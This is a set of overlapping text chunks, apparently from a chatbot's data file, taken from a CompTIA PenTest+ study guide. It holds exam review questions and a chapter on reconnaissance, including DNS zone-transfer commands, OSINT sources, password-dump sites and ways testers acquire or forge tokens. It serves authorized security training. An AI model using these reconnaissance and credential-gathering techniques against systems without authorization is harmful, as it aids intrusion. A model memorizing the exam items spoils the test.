deliverables for those engagements, and nondisclosure agreements that protect the data and information involved in a penetration test. You must also be aware of the legal and regulatory environment in which both you and your target operate so that your testing process and tools are legal. Finally, it's critical to ensure that appropriate legal agreements, with approvals from proper signing authorities, are in place so that you are covered in the event of something going wrong. Be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to understand legal concepts like master service agreements that define the overall contract between organizations for engagements, statements of work that define the deliverables for those engagements, and nondisclosure agreements that protect the data and information involved in a penetration test. You must also be aware of the legal and regulatory environment in which both you and your target operate so that your testing process and tools are legal. Finally, it's critical to ensure that appropriate legal agreements, with approvals from proper signing authorities, are in place so that you are covered in the event of something going wrong. Be able to explain the issues, objectives, and caveats that you may encounter when conducting compliance‐based assessments. Compliance, in the form of laws, regulations, and industry standards, drives many penetration tests. Understanding regulations like GDPR that have specific requirements you may need to meet as part of your testing process will help you better complete compliance assessments. Standards like PCI DSS that require compliance from credit card merchants provide clearly defined objectives but also have specific rules that may influence both how you conduct your assessment and the rules of engagement for the overall test. Lab Exercises 1. Describe the key data privacy and data protection requirements found in the GDPR. 2. Explain why you would recommend a known environment, a partial knowledge, or an unknown environment assessment. Under what circumstances is each preferable, and why? 3. Explain what an SLA, an NDA, an MSA, and an SOW are in the context of legal agreements related to a penetration test and where you might use each one. 4. Choose a system, network, or application that you are familiar with. Draw an architecture diagram for it, making sure you label each dataflow, system, network component, or architectural feature. 5. Using the diagram you created in step 4, list the support resources you would request for the system or application if you were conducting a known environment penetration test. 6. Using the information you created in steps 4 and 5, build an in‐scope list and an out‐of‐scope list for assets, systems, networks, and other components related to the system or application. Why would you include some elements, and why might you recommend some elements for exclusion? Review Questions You can find the answers in the Appendix A. 1. What term describes a document created to define project‐specific activities, deliverables, and timelines based on an existing contract? A. NDA B. MSA C. SOW D. MOD 2. Maria wants to build a penetration testing process for her organization and intends to start with an existing standard or methodology. Which of the following is not suitable for that purpose? A. ISSAF B. OSSTM C. PTES D. ATT&CK 3. Which of the following types of penetration test would provide testers with complete visibility into the configuration of a web server without having to compromise the server to gain that information? A. Unknown environment B. Partial knowledge C. Known environment D. Zero knowledge 4. What type of legal
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	an existing contract? A. NDA B. MSA C. SOW D. MOD 2. Maria wants to build a penetration testing process for her organization and intends to start with an existing standard or methodology. Which of the following is not suitable for that purpose? A. ISSAF B. OSSTM C. PTES D. ATT&CK 3. Which of the following types of penetration test would provide testers with complete visibility into the configuration of a web server without having to compromise the server to gain that information? A. Unknown environment B. Partial knowledge C. Known environment D. Zero knowledge 4. What type of legal agreement typically covers sensitive data and information that a penetration tester may encounter while performing an assessment? A. A noncompete B. An NDA C. A data security agreement D. A DSA 5. During a penetration test scoping discussion, Charles is asked to test the organization's SaaS‐based email system. What concern should he bring up? A. Cloud‐based systems require more time and effort. B. Determining the scope will be difficult due to the size of cloud‐ hosted environments. C. Cloud service providers do not typically allow testing of their services. D. Testing cloud services is illegal. 6. During a penetration test, Alex discovers that he is unable to scan a server that he was able to successfully scan earlier in the day from the same IP address. What has most likely happened? A. His IP address was whitelisted. B. The server crashed. C. The network is down. D. His IP address was blacklisted. 7. What does an MSA typically include? A. The terms that will govern future agreements B. Mutual support during assessments C. Microservices architecture D. The minimum service level acceptable 8. While performing an on‐site penetration test, Cassandra plugs her laptop into an accessible network jack. When she attempts to connect, however, she does not receive an IP address and gets no network connectivity. She knows that the port was working previously. What technology has her target most likely deployed? A. Jack whitelisting B. Jack blacklisting C. NAC D. 802.15 9. What type of penetration test is not aimed at identifying as many vulnerabilities as possible and instead focuses on vulnerabilities that specifically align with the goals of gaining control of specific systems or data? A. An objectives‐based assessment B. A compliance‐based assessment C. A black‐team assessment D. A red‐team assessment 10. During an on‐site penetration test, what scoping element is critical for wireless assessments when working in shared buildings? A. Encryption type B. Wireless frequency C. SSIDs D. Preshared keys 11. Ruchika has been asked to conduct a penetration test against internal business systems at a mid‐sized company that operates only during a normal day shift. The test will be run against critical business systems. What restriction is most likely to be appropriate for the testing? A. Time of day B. Types of allowed tests C. Types of prohibited tests D. The physical locations that can be tested 12. During a penetration test specifically scoped to a single
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	element is critical for wireless assessments when working in shared buildings? A. Encryption type B. Wireless frequency C. SSIDs D. Preshared keys 11. Ruchika has been asked to conduct a penetration test against internal business systems at a mid‐sized company that operates only during a normal day shift. The test will be run against critical business systems. What restriction is most likely to be appropriate for the testing? A. Time of day B. Types of allowed tests C. Types of prohibited tests D. The physical locations that can be tested 12. During a penetration test specifically scoped to a single web application, Christine discovers that the web server also contains a list of passwords to other servers at the target location. After she notifies the client, they ask her to use them to validate those servers, and she proceeds to test those passwords against the other servers. What has occurred? A. Malfeasance B. Known environment testing C. Scope creep D. Target contraction 13. Lucas has been hired to conduct a penetration test of an organization that processes credit cards. His work will follow the recommendations of the PCI DSS. What type of assessment is Lucas conducting? A. An objectives‐based assessment B. A red‐team assessment C. A black‐team assessment D. A compliance‐based assessment 14. The penetration testing agreement document that Greg asks his clients to sign includes a statement that the assessment is valid only at the point in time at which it occurs. Why does he include this language? A. His testing may create changes. B. The environment is unlikely to be the same in the future. C. Attackers may use the same flaws to change the environment. D. The test will not be fully comprehensive. 15. The company that Ian is performing a penetration test for uses a wired network for their secure systems and does not connect it to their wireless network. What environmental consideration should Ian note if he is conducting a partial knowledge penetration test? A. He needs to know the IP ranges in use for the secure network. B. He needs to know the SSIDs of any wireless networks. C. Physical access to the network may be required. D. Physical access to a nearby building may be required. 16. Megan wants to gather data from a service that provides data to an application. What type of documentation should she look for from the application's vendor? A. Database credentials B. System passwords C. API documentation D. Network configuration settings 17. Charles has completed the scoping exercise for his penetration test and has signed the agreement with his client. Whose signature should be expected as the counter signature? A. The information security officer B. The project sponsor C. The proper signing authority D. An administrative assistant 18. Elaine wants to ensure that the limitations of her red‐team penetration test are fully explained. Which of the following are valid disclaimers for her agreement? (Choose two.) A. Risk tolerance B. Point‐in‐time C. Comprehensiveness D. Impact tolerance 19. Jen wants
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	A. Database credentials B. System passwords C. API documentation D. Network configuration settings 17. Charles has completed the scoping exercise for his penetration test and has signed the agreement with his client. Whose signature should be expected as the counter signature? A. The information security officer B. The project sponsor C. The proper signing authority D. An administrative assistant 18. Elaine wants to ensure that the limitations of her red‐team penetration test are fully explained. Which of the following are valid disclaimers for her agreement? (Choose two.) A. Risk tolerance B. Point‐in‐time C. Comprehensiveness D. Impact tolerance 19. Jen wants to conduct a penetration test and includes mobile application testing. Which standard or methodology is most likely to be useful for her efforts? A. NIST B. OWASP C. KALI D. ISSAF 20. What type of assessment most closely simulates an actual attacker's efforts? A. A red‐team assessment with a zero knowledge strategy B. A goals‐based assessment with a full knowledge strategy C. A red‐team assessment with a full knowledge strategy D. A compliance‐based assessment with a zero knowledge strategy Chapter 3 Information Gathering THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 2: Reconnaissance and Enumeration 2.1 Given a scenario, apply information gathering techniques. Active and passive reconnaissance Open‐source intelligence (OSINT) Social media Job boards Scan code repositories Domain Name System (DNS) DNS lookups Reverse DNS lookups Cached pages Cryptographic flaws Password dumps Network reconnaissance Protocol scanning Transmission Control Protocol (TCP)/User Datagram Protocol (UDP) scanning Certificate transparency logs Information disclosure Strategic search engine analysis/enumeration Network sniffing Internet of Things (IoT) and operational technology (OT) protocols Banner grabbing Hypertext Markup Language (HTML) scraping 2.2 Given a scenario, apply enumeration techniques. Operating system (OS) fingerprinting Service discovery Protocol enumeration DNS enumeration Directory enumeration Host discovery Local user enumeration Email account enumeration Wireless enumeration Permission enumeration Secrets enumeration Cloud access keys Passwords API keys Session tokens Attack path mapping Web application firewall (WAF) enumeration Origin address Web crawling Manual enumeration Robots.txt Sitemap Platform plugins 2.4 Given a scenario, use the appropriate tools for reconnaissance and enumeration. Wayback Machine Maltego Recon‐ng Shodan SpiderFoot WHOIS nslookup/dig Censys.io Hunter.io DNSdumpster Amass Nmap Nmap Scripting Engine (NSE) theHarvester WiGLE.net InSSIDer OSINTframework.com Wireshark/tcpdump Aircrack‐ng The Reconnaissance and Enumeration domain of the CompTIA PenTest+ certification exam objectives cover information gathering and vulnerability scanning as well as how to analyze and utilize vulnerability scanning information. In this chapter, you will explore how to gather information about an organization using passive open source intelligence (OSINT) as well as active enumeration and scanning methods. We will also take a look at other important techniques, including defense detection, packet crafting, capture, and inspection for information gathering, in addition to the role of code analysis for intelligence gathering and related techniques. Real World Scenario Scenario, Part 1: Plan for a Vulnerability Scanning You have recently been engaged to perform an unknown environment penetration test against MCDS, LLC. You have worked out the scope of work and rules of engagement and know that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	you will explore how to gather information about an organization using passive open source intelligence (OSINT) as well as active enumeration and scanning methods. We will also take a look at other important techniques, including defense detection, packet crafting, capture, and inspection for information gathering, in addition to the role of code analysis for intelligence gathering and related techniques. Real World Scenario Scenario, Part 1: Plan for a Vulnerability Scanning You have recently been engaged to perform an unknown environment penetration test against MCDS, LLC. You have worked out the scope of work and rules of engagement and know that your engagement includes the organization's website and externally accessible services, as well as all systems on both wired and wireless networks in their main headquarters location. Third‐party providers, services, and off‐site locations are not included in the scope of the test. Since this is an unknown environment test, you must first identify the organization's domains, IP ranges, and other information, and then build and execute an information‐gathering plan. This scenario continues throughout Chapter 3 and is expanded on in both Chapter 4, “Vulnerability Scanning,” and Chapter 5, “Analyzing Vulnerability Scans.” Reconnaissance and Enumeration In order to penetrate, you first need to understand the basics of identifying your target. Just like any malicious attacker would do, your first step is to see what information can be gathered about your target. This is done by performing reconnaissance and enumeration techniques. In this chapter you will learn these techniques and how to actively identify targets using various methods and solutions you will need to know for the exam. Active and Passive Reconnaissance The first step in many penetration tests is to gather information about the organization via active or passive intelligence gathering methods. For the PenTest+ exam, it's imperative that you understand both active and passive reconnaissance and the methodology that is used to determine what makes them active or passive. Also remember, active reconnaissance means there is a good chance the person conducting it will be detected while passive means you are less likely to be detected. Active reconnaissance methods involve direct interactions with target systems and services and is intended to gather information that will allow penetration testers to target attacks effectively. Port scans, version scans, and other interactive assessment techniques are used to gather information in this phase of a penetration test. Testers should be very familiar with tools like Nmap, including any specific flags and scan capabilities. Active reconnaissance may include the need to identify defenses, determine if third‐party or cloud‐hosted systems may be included in infrastructure or target lists, and how to avoid detection. Passive reconnaissance methods are those that do not actively engage the target organization's systems, technology, defenses, people, or locations. The information gathered through this process is often called OSINT, or open source intelligence. Among other data that can be gathered, OSINT is often used to determine the organization's footprint: a listing of all the systems, networks, and other technology that an organization has. Of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Nmap, including any specific flags and scan capabilities. Active reconnaissance may include the need to identify defenses, determine if third‐party or cloud‐hosted systems may be included in infrastructure or target lists, and how to avoid detection. Passive reconnaissance methods are those that do not actively engage the target organization's systems, technology, defenses, people, or locations. The information gathered through this process is often called OSINT, or open source intelligence. Among other data that can be gathered, OSINT is often used to determine the organization's footprint: a listing of all the systems, networks, and other technology that an organization has. Of course, if you are conducting a known environment test, you may already have all this information in the documentation provided by the target organization. OSINT OSINT includes data from publicly available sources, such as Domain Name System (DNS) registrars, web searches, security‐centric search engines like Shodan and Censys, and a myriad of other information sources. It also includes information beyond technology‐centric organizational information. Social media, corporate tax filings, public information, and even the information found on an organization's website in its job postings can be part of open source intelligence gathering. The goal of an OSINT‐gathering process is to obtain the information needed to perform an effective penetration test. Since the tests will vary in scope and resources, a list of desired information is built for each engagement. That doesn't mean you can't work from a standardized list, but it does mean you need to consider the type of engagement, the information you have available, and the information you need to effectively understand your target. OSINT gathering may continue throughout an engagement as you discover additional information that you want to acquire or if you find additional in‐scope items that require you to perform more research. Social Media Passive reconnaissance, often called OSINT, is information that can be gathered from third‐party sources without interacting with the target's systems and networks. OSINT can be gathered through searches, by gathering and reviewing metadata from documents and other materials that are publicly available, reviewing third‐party information sources like public records and databases, and using additional resources such as social media. Social media are public and private websites or apps that are used for the purpose of social interaction. People who use social media sites can leverage the platforms they choose to subscribe to in order to share information such as pictures and videos, collaborate, market business ideas, and communicate in many different ways. There are many sites available with some of the most common ones being X (formerly Twitter), Facebook, Instagram, LinkedIn, Pinterest, TikTok, Reddit, YouTube, Bluesky, and many more. These virtual communities allow for easy access to information. The pros to using it are that you can stay connected with friends and family and share information and communicate. Although this seems like a great idea, for those who look to use your information against you, you are giving them the keys to the castle. You can secure your social media sites by
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	collaborate, market business ideas, and communicate in many different ways. There are many sites available with some of the most common ones being X (formerly Twitter), Facebook, Instagram, LinkedIn, Pinterest, TikTok, Reddit, YouTube, Bluesky, and many more. These virtual communities allow for easy access to information. The pros to using it are that you can stay connected with friends and family and share information and communicate. Although this seems like a great idea, for those who look to use your information against you, you are giving them the keys to the castle. You can secure your social media sites by making them private, but they are easy to infiltrate for the purposes of reconnaissance and information gathering. A lot of information can be gleaned from these sites, so as a pentester, be aware that you can passively gather information to conduct your testing through various methods to include web scraping using simplified tools and solutions. Although there are many tools out there that can perform this function, note that the two most common types are code and no‐code, meaning that some scrapers can be used as a tool with no need to know how to use code, versus solutions that are primarily made and use direction from a command prompt using coding scripts. Another method of scraping can be done through an application programming interface (API). APIs allow for connection into a social media platform and can give a third party access to your data, thus scraping it for use. This can provide access to posts, comments, media and various other data that can be used in information collection and gathering. A commonly used solution found online is Bright Data (https://brightdata.com). Note, although we are using nslookup here for this example (Figure 3.1), there are many other tools you can use to get the same results as well. In contrast to a forward lookup, a reverse lookup will do the exact opposite of what the lookup did. A reverse lookup will locate the DNS name for the IP address you query. So, if you have an IP address and need to resolve the hostname from the DNS record, the reverse lookup will allow you to gather that information. SSL and TLS Another place to gather information from is through the TLS certificates that organizations use for their services. For example, simply viewing the certificate information for Google.com provides information about other domains that might be of interest under the subject alternative name, as shown in the following partial list: DNS Name=*.google.com DNS Name=*.appengine.google.com DNS Name=*.bdn.dev DNS Name=*.cloud.google.com DNS Name=*.crowdsource.google.com DNS Name=*.datacompute.google.com DNS Name=*.googleadapis.com DNS Name=*.googlevideo.com DNS Name=*.gstatic.cn DNS Name=android.com DNS Name=g.co DNS Name=urchin.com DNS Name=youtu.be DNS Name=youtube.com DNS Name=youtubeeducation.com DNS Name=youtubekids.com DNS Name=yt.be DNS Name=android.clients.google.com DNS Name=developer.android.google.cn DNS Name=source.android.google.cn TLS certificates can provide a treasure trove of easily accessible information about systems, domain names, and even individuals inside of an organization. They can even be an indicator of poor systems maintenance. If you discover an out‐of‐date certificate, it may be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	other domains that might be of interest under the subject alternative name, as shown in the following partial list: DNS Name=*.google.com DNS Name=*.appengine.google.com DNS Name=*.bdn.dev DNS Name=*.cloud.google.com DNS Name=*.crowdsource.google.com DNS Name=*.datacompute.google.com DNS Name=*.googleadapis.com DNS Name=*.googlevideo.com DNS Name=*.gstatic.cn DNS Name=android.com DNS Name=g.co DNS Name=urchin.com DNS Name=youtu.be DNS Name=youtube.com DNS Name=youtubeeducation.com DNS Name=youtubekids.com DNS Name=yt.be DNS Name=android.clients.google.com DNS Name=developer.android.google.cn DNS Name=source.android.google.cn TLS certificates can provide a treasure trove of easily accessible information about systems, domain names, and even individuals inside of an organization. They can even be an indicator of poor systems maintenance. If you discover an out‐of‐date certificate, it may be a useful indicator that the system or device isn't being properly maintained and updated and that other flaws or misconfigurations may exist. FIGURE 3.1 nslookup for Netflix.com Remember that even though you'll often see certificates referred to as SSL certificates, they're actually using TLS. Zone Transfers A DNS zone transfer (AXFR) is a transaction that is intended to be used to replicate DNS databases between DNS servers. Of course, this means that the information contained in a zone transfer can provide a wealth of information to a pentester and that most DNS servers will have zone transfers disabled or well protected. Knowing how to conduct a zone transfer is still a potentially useful skill for a pentester, and you should know the three most common ways to conduct one: host: host -t axfr domain.name dns-server dig: dig axfr @target.nameserver.com domain.name nmap (using the Nmap Scripting Engine [NSE]): nmap -script dns-zone-transfer.nse -script-args dns-zone-transfer.domain<domain> -p53 <hosts> A zone transfer will show you quite a bit of data, including the name server, primary contact, serial number, time between changes, the minimum time to live for the domain, MX records, latitude and longitude, and other TXT records, which can show a variety of useful information. Of course, the zone transfer will also contain service records, IP address mappings, and other information as well. Even though the PenTest+ exam outline doesn't specifically include zone transfers, they're a useful technique to know about. If you'd like to practice zone transfers, Robin Wood provides a domain you can practice with. You can find details, as well as a great walk‐through of what a zone transfer will include, at https://digi.ninja/projects/zonetransferme.php. If a zone transfer isn't possible, DNS information can still be gathered from public DNS by brute force. You can do this by sending a DNS query for each IP address that the organization uses, thus gathering a useful list of systems. Cached Pages Another method of conducting passive reconnaissance is by scrutinizing available data for useful information. One of the methods for doing so is accessing and using cached pages—more specifically, by looking through cached pages of websites or from web browsers. This information can hold a plethora of useful data such as your access history, cookies, and past transactions. The challenge is that having this data cached provides for a better quality of service when using the web, but if compromised, it can also inadvertently expose
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	each IP address that the organization uses, thus gathering a useful list of systems. Cached Pages Another method of conducting passive reconnaissance is by scrutinizing available data for useful information. One of the methods for doing so is accessing and using cached pages—more specifically, by looking through cached pages of websites or from web browsers. This information can hold a plethora of useful data such as your access history, cookies, and past transactions. The challenge is that having this data cached provides for a better quality of service when using the web, but if compromised, it can also inadvertently expose you to danger. When conducting information‐gathering exercises, cached data can be collected to show specific things such as URL history. Where this becomes useful is by showing an attacker the sites you visit, which in itself can help to create a map to various points of interest or targets. As an example, if you are an IT worker and visiting a login site often, the attacker now has the URL to the login. There can also be private data stored in the cache to include preferences, passwords, and other comprisable information. A good way to secure against this is to clear your cache often or set your web browser in a way that it doesn't collect large amounts of this data in the first place. When you're looking to scrape data from sites, the best way to find them is to use a search engine. A quick way to search for exposed systems belonging to an organization by domain or IP address is to use a security search engine. These search engines provide a way to review hosts, services, and other details without actively probing networks yourself. Once you identify what you want to scan or scrape, you need to conduct the review by using tools such as Shodan. Cryptographic Flaws The use of exploiting cryptographic flaws is yet another method of conducting passive reconnaissance. By using data found in certificates, tokens, and other various methods of applying security via cryptography, you can expose many details about an organization aiding your passive reconnaissance efforts. First, let's review certificates, enumeration, and inspection. Certificate Enumeration and Inspection The certificates that an organization's websites present can be enumerated as part of an information‐gathering effort. Nmap can gather certificate information using the ssl‐cert NSE script, and all major vulnerability scanners have the ability to grab and validate certificate information. As you might expect, web application vulnerability scanners also specifically build in this capability. Knowing what certificates are in use, and if they are expired, revoked, or otherwise problematic, can be useful to a pentester because out‐of‐date certificates and other cryptographic flaws often point to other administrative or support issues that may be exploited. Certificates are also used for users and services and may be acquired during later stages of a penetration test. User and service certificates and keys are typically tracked as they are acquired rather than directly enumerated. Tokens Tokens are used in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	grab and validate certificate information. As you might expect, web application vulnerability scanners also specifically build in this capability. Knowing what certificates are in use, and if they are expired, revoked, or otherwise problematic, can be useful to a pentester because out‐of‐date certificates and other cryptographic flaws often point to other administrative or support issues that may be exploited. Certificates are also used for users and services and may be acquired during later stages of a penetration test. User and service certificates and keys are typically tracked as they are acquired rather than directly enumerated. Tokens Tokens are used in many places, including communications between Windows systems, for web application access, and throughout infrastructure where systems and devices need to communicate. That means that tokens are a target for penetration testers who seek to acquire legitimate tokens that they can use or to forge legitimate tokens for their own purposes. Of course, the ability to create and issue legitimate tokens by acquiring private keys or controlling the token generation capability is an even more powerful opportunity if it is achievable! Attacking Windows systems may involve acquiring SYSTEM rights by using tokens that are used to authenticate via NTLM. Penetration testers who want to test the security of web application sessions often encounter JSON Web Tokens (JWTs). These tokens are used to make assertions and are signed with the server's key, and they contain a header, payload or content, and a signature from the server. Penetration testers specializing in web application testing use a variety of techniques to acquire secret keys that allow tokens to be forged, potentially providing access to their target web application. You won't need to forge a token for the PenTest+ exam, but you should understand why a pentester may want to acquire and use a token and why token‐based vulnerabilities can be a problem for organizations. You can read more, including a good overview of JWT techniques, at https://medium.com/@netscylla/json-web-token-pentesting890bc2cf0dcd, and you can read about Windows tokens using Metasploit at https://pentestlab.blog/2017/04/03/token-manipulation. The PenTest+ exam outline focuses on three key areas for tokens: The first is scoping tokens. Tokens may specifically identify a user and then limit the actions that that user can take based on their scope, or they may identify an application and limit the actions it can take in a given scope. In essence, you can think of this as the set of limitations and conditions set on a token that determine what it can do and where it can do it. As a penetration tester, acquiring a token without scoping limitation, or with limitations that allow the actions that you need to perform, is a likely goal. Issuing a token is another component of the token life cycle that penetration testers may target. If you can cause the token‐issuing system to issue arbitrary tokens that match your needs, or you can obtain the ability to sign your own tokens, you can then use those tokens to perform other actions. This means that targeting the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	conditions set on a token that determine what it can do and where it can do it. As a penetration tester, acquiring a token without scoping limitation, or with limitations that allow the actions that you need to perform, is a likely goal. Issuing a token is another component of the token life cycle that penetration testers may target. If you can cause the token‐issuing system to issue arbitrary tokens that match your needs, or you can obtain the ability to sign your own tokens, you can then use those tokens to perform other actions. This means that targeting the issuing server or process as well as the secret signing key are both common in token‐based penetration testing activities. Revocation can create challenges for penetration testers. If a token is revoked, the penetration tester may not be able to continue to use it. This means you need to understand how tokens can be revoked, if the application or service properly handles token revocation, and if you can avoid having a token that you have issued or acquired being revoked. Token‐based attacks can be complex, leading many penetration testers to rely on tools like Metasploit to conduct the majority of their token acquisition and exploit attacks. As you consider the multiple ways that tokens are used in modern environments, make sure that you think about where tokens might be used and how you might acquire them. Password Dumps Penetration testers may also use credentials that have been previously breached as part of their testing. Credential reuse is common despite best practices that most organizations try to hold to, and if multifactor authentication is not required, a reused password and a breach of another site can provide an easy way in. Sites like http://haveibeenpwned.com and tools like pwnedOrNot provide easy access to existing password dump information. Also note, there are various other tools you can use for password dumps; Rockyou and various others can be found here: https://github.com/praetorian-inc/Hob0Rules/tree/master/wordlists. While you're thinking about how to use existing breaches for your penetration testing, you may want to check http://haveibeenpwned.com for your own email addresses. Even if you don't reuse passwords, you may be surprised about what has been breached and where you may want to go change credentials and enable multifactor authentication if you can! Network reconnaissance information about the infrastructure, technologies, and networks that an organization uses is often one of the first things that a pentester will gather in a passive information search. Once you have a strong understanding of the target, you can design the next phase of your penetration test. External footprinting is part of most passive reconnaissance and is aimed at gathering information about the target from external sources. That means gathering information about domains, IP ranges, and routes for the organization. IP Ranges and Addresses Once you know the IP address that a system is using, you can look up information about the IP range it resides in. That can provide information about the company or about the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	things that a pentester will gather in a passive information search. Once you have a strong understanding of the target, you can design the next phase of your penetration test. External footprinting is part of most passive reconnaissance and is aimed at gathering information about the target from external sources. That means gathering information about domains, IP ranges, and routes for the organization. IP Ranges and Addresses Once you know the IP address that a system is using, you can look up information about the IP range it resides in. That can provide information about the company or about the hosting services it uses. The IP address or hostname can also be used to gather information about the network topology around the system or device that has a given IP address. One of the first stops once you have an IP address is to look up who owns the IP range. You can do this at sites like https://www.whois.com/whois. If you check the final IP address we found (which was 52.41.111.100), you can see that it is owned by Amazon, as shown in Figure 3.2. If we were doing a penetration test of Netflix's networks, scanning Amazon might be a violation of our rules of engagement or scope, so this sort of research and review is important! FIGURE 3.2 WHOIS of 52.41.111.100 Now that we know who owns it, we can also explore the route to the IP. Using traceroute (or tracert on Windows systems), you can see the path packets take to the host. Since the Internet is designed to allow traffic to take the best path, you may see multiple different paths on the way to the system, but you will typically find that the last few responses stay the same. These are often the local routers and other network devices in an organization's network, and knowing how traffic gets to a system can give you insight into their internal network topology. In Figure 3.3, you can see that in a traceroute for Netflix.com, some systems don't respond with hostname data, as shown by the asterisks and “request timed out” entries, and that the last two systems return only IP addresses. FIGURE 3.3 tracert of Netflix.com When organizations use cloud‐hosted infrastructure or hosted services, this can all become more complex. As a pentester, you need to carefully validate where the services and systems you encounter are hosted and make sure that you have permission to test them. You may encounter hybrid environments that combine on‐site, hosted, and/or third‐party components, and you must understand the potential impact of any actions you take. Routes A final type of network information that you may look for is routing information. The routing information for an organization can provide insight into how their external network connectivity is set up. Public BGP route information servers known as BGP looking glasses make that information easily accessible. You can find a list of them, including both global and regional servers, at https://www.bgp4.as/looking-glasses. Wireless Networks Gathering information
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	make sure that you have permission to test them. You may encounter hybrid environments that combine on‐site, hosted, and/or third‐party components, and you must understand the potential impact of any actions you take. Routes A final type of network information that you may look for is routing information. The routing information for an organization can provide insight into how their external network connectivity is set up. Public BGP route information servers known as BGP looking glasses make that information easily accessible. You can find a list of them, including both global and regional servers, at https://www.bgp4.as/looking-glasses. Wireless Networks Gathering information about wireless networks can involve a technique known as wardriving. Wardriving is the process of scanning for wireless networks while mobile (usually in a car), but walking through open areas is a common process too—although some might insist on calling it warwalking. Wardriving data can then be matched to data sources like Wigle.net, an open wireless network database, or mapped using triangulation based on the strength of the signal from each access point. If you would like to learn more about the topic, it is covered in more depth here: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things. Help! I'm Drowning in Data! A variety of tools can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test. Examples include theHarvester, a tool designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines, and Maltego, which builds relationship maps between people and their ties to other resources. Recon‐ng is an OSINT‐gathering tool that allows you to automate information gathering in a Metasploit‐like tool with plug‐ins to do many types of searches. It's worth noting that although using a tool like theHarvester can help simplify searches of large datasets, it is not a complete substitute for a human's creativity. Protocol Scanning As you have learned with network reconnaissance, there is much to passively glean from this infrastructure. When conducting your assessment to determine what you can find, one of the ways to learn more about your target is to identify what protocols are being used internally and externally to your network. As a quick primer (or reminder), there are countless numbers of protocols, each with a specific function and task that tie back to port numbers, additional functionality, and even some protocols working together in unison to provide certain services. It's highly complicated; however, in its most basic form, a protocol is nothing more than a communication method used to provide interaction between systems, services, and devices. When focusing solely on the network, there are many commonly used protocols that help to provide a map to what the organization is using and how its laid out. For example, if you are using TCP/IP (which nearly all networks do), then you can be assured that other protocols are likely being used like SMTP, SNMP, DNS, and ARP. These are some of the most commonly used protocols in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to provide certain services. It's highly complicated; however, in its most basic form, a protocol is nothing more than a communication method used to provide interaction between systems, services, and devices. When focusing solely on the network, there are many commonly used protocols that help to provide a map to what the organization is using and how its laid out. For example, if you are using TCP/IP (which nearly all networks do), then you can be assured that other protocols are likely being used like SMTP, SNMP, DNS, and ARP. These are some of the most commonly used protocols in an IP‐based network, and you can identify a lot of information from each one. The way you scan protocols is by either gaining access to a device (which is more active than passive), or passively collect this information with tools that you have set up. Two very commonly used tools to conduct this assessment are Wireshark and Nmap. Wireshark is a protocol analyzer that will actively collect (sniff) the network for passing packets and data, collect it, and then provide a showing of this data in a handy tool that you can drill down with and see within the data. For example, a captured packet can show you the headers and within them, specifically what IP addresses, protocols, port numbers, and so much more may be used. You can also use Nmap to scan your network to collect similar information. You can use both to perform your initial reconnaissance and develop a vulnerability scanning plan based on those results. For the purposes of this chapter, our goal is to first create the map. Transmission Control Protocol (TCP)/User Datagram Protocol (UDP) Scanning As just mentioned, using a protocol analyzer or other capture tool, you can scan IP‐based networks and review the captured data. When scanning both Transmission Control Protocol (TCP) and User Datagram Protocol (UDP), there is much to find within to help conduct passive reconnaissance. First, let's quickly review the basics of both protocols. Within the TCP/IP protocol stack, there are different layers of operation. Often referenced with the OSI model, each layer performs a specific function. With TCP/IP, IP operates at layer 3 and is primarily responsible for routing functions. Layer 4 is where both Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) function. Each protocol does a similar job of overseeing IP, but they each do it very differently. Transmission Control Protocol (TCP) is a connection‐oriented protocol that has a lot more overhead to it (which you can see within your protocol scan and captured) that allows for a check‐back system to make sure that delivery of data from source to destination is confirmed. If not, it's reattempted until it is and each time it will send data back and forth, allowing you to know that it's been reattempted. User Datagram Protocol (UDP) also oversees IP‐based routing and data transfer. However, it is considered connectionless and will not provide assurances of delivery. It's used with communications that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	very differently. Transmission Control Protocol (TCP) is a connection‐oriented protocol that has a lot more overhead to it (which you can see within your protocol scan and captured) that allows for a check‐back system to make sure that delivery of data from source to destination is confirmed. If not, it's reattempted until it is and each time it will send data back and forth, allowing you to know that it's been reattempted. User Datagram Protocol (UDP) also oversees IP‐based routing and data transfer. However, it is considered connectionless and will not provide assurances of delivery. It's used with communications that are less likely to need these checks and balances, and the benefit of using it is that it has very little overhead. Now that you understand the functionality, when it comes to passive reconnaissance efforts, scanning these protocols provides you with data that helps you to learn much of what was just covered to include what ports are being used, what services are offered, and what the overall attack surface and vectors may be based on that map. When a scan is conducted, it will show specifics such as, if using Nmap, what target ports (and services) are offered and if they are open or not. Both TCP and UDP are checked respectively to map these specific services. Certificate Transparency Logs When conducting passive reconnaissance, another available option is to review certificate transparency logs. A certificate transparency log is an artifact generated from a service called Certificate Transparency (CT). This framework is an openly used source of truth applied to attempt to solve a problematic system of certificate use and misuse. The challenge comes from entities that issue certificates that are not compliant with appropriate standards. A CA (certificate authority) that issues certificates improperly can cause a series of security challenges, so CT is applied to help provide a checks‐and‐balances system where logs can be reviewed for accuracy. CT logs are used to help provide a checks‐and‐ balances system for the detection of bad certificates. Now that you know what CT is and how logs are used, how does that help with the passive reconnaissance effort and what does it show about a target? Many things to include specifically what really lies within the Public 